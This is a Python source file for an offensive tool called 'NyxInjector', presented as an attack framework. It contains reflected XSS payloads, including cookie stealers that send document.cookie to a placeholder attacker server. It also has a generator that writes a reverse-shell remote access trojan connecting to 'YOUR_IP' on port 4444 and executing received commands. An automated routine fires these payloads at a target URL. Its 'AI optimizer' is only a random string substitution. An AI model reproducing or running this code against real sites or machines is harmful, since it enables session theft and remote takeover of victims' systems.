import argparse
import requests
import random
import string
import socket
import subprocess
import threading

class NyxInjector:
    def __init__(self):
        self.version = "1.2"
        self.payloads = {
            "basic_xss": "<script>alert('NyxInjector')</script>",
            "shadow_injection": "<script>const shadow = document.body.attachShadow({mode: 'open'}); shadow.innerHTML = '<h1>Owned by Nyx</h1>';</script>",
            "rat_payload": "<script>new Image().src='http://your-server.com/rat?cookie='+document.cookie;</script>",
            "stealer": "<script>fetch('http://your-server.com/steal?data='+btoa(document.cookie+document.location))</script>"
        }

    def ai_optimize_payload(self, base_payload):
        mutations = ["alert", "console.log", "eval", "document.write"]
        mutated = base_payload.replace("alert", random.choice(mutations))
        mutated += f"<!-- Nyx v{self.version} -->"
        return mutated

    def generate_rat(self):
        rat_code = '''
import socket
import subprocess
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("YOUR_IP", 4444))
while True:
    cmd = s.recv(1024).decode()
    if cmd.lower() == "exit":
        break
    output = subprocess.getoutput(cmd)
    s.send(output.encode())
        '''
        with open("nyx_rat.py", "w") as f:
            f.write(rat_code)
        print("[+] RAT generated: nyx_rat.py")

    def auto_exploit(self, target_url):
        print(f"[+] Starting auto-exploitation on {target_url}")
        payload = self.ai_optimize_payload(self.payloads["shadow_injection"])
        self.test_xss(target_url, payload)

    def test_xss(self, target_url, payload):
        try:
            test_url = f"{target_url}?q={payload}"
            response = requests.get(test_url, timeout=5)
            if payload in response.text or "Nyx" in response.text:
                print(f"[+] EXPLOIT SUCCESS on {test_url}")
                return True
            return False
        except:
            return False

def main():
    parser = argparse.ArgumentParser(description=f"NyxInjector v1.2 - Advanced Attack Framework")
    parser.add_argument("-t", "--target", help="Target URL")
    parser.add_argument("-p", "--payload", choices=["basic_xss", "shadow_injection", "rat_payload", "stealer"], default="basic_xss")
    parser.add_argument("--rat", action="store_true", help="Generate RAT")
    parser.add_argument("--auto", action="store_true", help="Auto exploitation mode")
    parser.add_argument("--optimize", action="store_true", help="Use AI payload optimizer")
    
    args = parser.parse_args()
    injector = NyxInjector()
    
    if args.rat:
        injector.generate_rat()
    
    payload = injector.payloads.get(args.payload)
    if args.optimize:
        payload = injector.ai_optimize_payload(payload)
    
    print(f"[+] NyxInjector v{injector.version} | Payload: {payload[:100]}...")
    
    if args.target:
        if args.auto:
            injector.auto_exploit(args.target)
        else:
            injector.test_xss(args.target, payload)

if __name__ == "__main__":
    main() 



